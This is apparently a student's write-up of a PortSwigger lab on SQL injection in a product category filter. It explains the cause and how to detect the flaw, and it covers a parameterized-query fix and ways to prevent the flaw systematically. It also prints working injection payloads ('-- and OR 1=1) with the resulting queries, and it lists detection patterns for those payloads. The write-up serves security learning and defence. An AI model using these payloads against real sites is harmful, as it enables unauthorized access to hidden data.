# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

| | |
|---|---|
| **Topic** | SQL injection |
| **Level** | Apprentice |
| **Lab link** | https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data |
| **Date solved** | 2026-11-02 |
| **Time taken** | ~2 min |
| **Hints used?** | No |
| **Status** | ✅ Solved |

## What

The product category filter puts user input straight into a SQL query. Changing that input lets me remove the `released = 1` restriction and see hidden products.

## Why it exists

The app builds the query by concatenating the `category` value into the SQL string:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

The database can't tell my input from the developer's SQL, so a quote in the input ends the string early and the rest is treated as code. Nothing validates or parameterizes the value.

## How to find it

- **Entry point:** the `category` parameter in `/filter?category=...`.
- **Signal:** adding a single quote `'` returned **Internal Server Error**. That means my input reached the query and broke its syntax, which is the first sign of injection.
- **Tool:** Burp Repeater (or the browser URL bar) to edit the parameter and compare responses.

## How to exploit it

1. Add `'` to the category. Result: Internal Server Error, so the input breaks the query.
2. Use `'--` to comment out the rest of the query. Result: the unreleased products for that category appear.
3. Use `'+OR+1=1--` to make the condition always true. Result: all products from all categories appear.

**Payloads:**

```
/filter?category=Gifts'
/filter?category=Gifts'--
/filter?category=Gifts'+OR+1=1--
```

**Resulting queries:**

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

## How to fix it

Use a parameterized query so the input is always treated as data:

```java
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM products WHERE category = ? AND released = 1");
stmt.setString(1, category);
ResultSet rs = stmt.executeQuery();
```

## How to prevent it systematically

- **Code review:** flag string concatenation inside any SQL query.
- **SAST:** Semgrep or CodeQL rule for SQL built from request parameters.
- **DAST:** Burp Scanner or ZAP on every endpoint with parameters.
- **Runtime:** alert on `'`, `--`, and `OR 1=1` patterns in request logs, plus spikes of 500 errors on one endpoint.

## Mistakes and dead ends

None on this lab. Lesson: a 500 error after a single quote is worth testing further on every parameter.

## Exam relevance

Basic SQLi detection (quote, then comment, then boolean) is the starting point for harder techniques like UNION attacks and blind SQLi. Treat a quote-triggered error as a lead worth following.

## Related

- Notes: [`../../notes/sql-injection.md`](../../notes/sql-injection.md)
- Next labs: login bypass, then UNION attacks
